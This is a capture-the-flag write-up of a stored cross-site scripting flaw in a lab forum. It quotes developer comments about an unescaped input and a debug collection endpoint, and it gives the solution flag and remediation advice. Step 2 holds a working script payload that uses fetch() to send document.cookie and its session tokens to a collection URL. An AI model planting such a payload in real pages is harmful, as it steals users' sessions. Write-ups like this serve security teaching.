# Stored Cross Site Scripting

- **Category:** (OWASP category)
    OWASP A03:2021 — Injection
    WSTG 4.7 — Stored XSS
- **Location:**
    `/forum`
- **Discovery:** 
  - `<!-- note to self: the "HTML supported" label is not a joke. content goes straight into the DB. don't tell students. — wil -->`
  - `<!-- wil: left /api/collect up from when I was debugging the bot — it logs whatever you throw at ?c= and hands it all back on GET. sophie: that is an open exfil log. wil: it's a DEBUG endpoint. -->`
- **Steps to Reproduce:**
  1. Go to 'Forum' on the tab and create a new post
  2. Put the following script in the content input field
   '<script>
    fetch('http://localhost:4942/api/collect?c=' + encodeURIComponent(document.cookie))
    </script>'
  3. Submit the input
  4. Go to '/api/collect' then you will find all sessions saved with its jwt token
- **Flag:** `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`
- **Cause:**
  Incorrect configuration for cookie setting and failure of auto-escaping
- **Remediation:**
  1. Frontend
    - Don't build HTML by inserting raw strings — use the framework's default rendering, which auto-escapes.
  2. Backend
    - If the website is server side rendering, backend template engine should handle auto-escaping.
    - Set HttpOnly, Secure, SameSite on every cookie.
    - Remove debug endpoints before deploying.
  3. Server configuration
    - Enforce security headers at the reverse proxy / gateway level (e.g. proxy_cookie_flags in Nginx)
